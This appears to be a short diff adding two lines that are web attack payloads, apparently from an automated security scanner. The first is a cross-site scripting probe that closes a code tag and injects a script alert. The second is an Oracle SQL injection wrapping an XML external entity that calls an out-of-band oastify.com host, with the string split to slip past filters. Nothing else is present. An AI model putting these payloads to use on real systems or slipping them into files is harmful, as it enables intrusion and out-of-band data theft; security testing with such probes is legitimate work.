@@ -1,0 +1,2 @@
+</code> <script> alert(document.url)</script><code>
+'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % iadds SYSTEM "http://3nrpkksu5rzcs921biqrc7v9t0ztnkr8vwnjf74.oasti'||'fy.com/">%iadds;]>'),'/l') from dual)||'
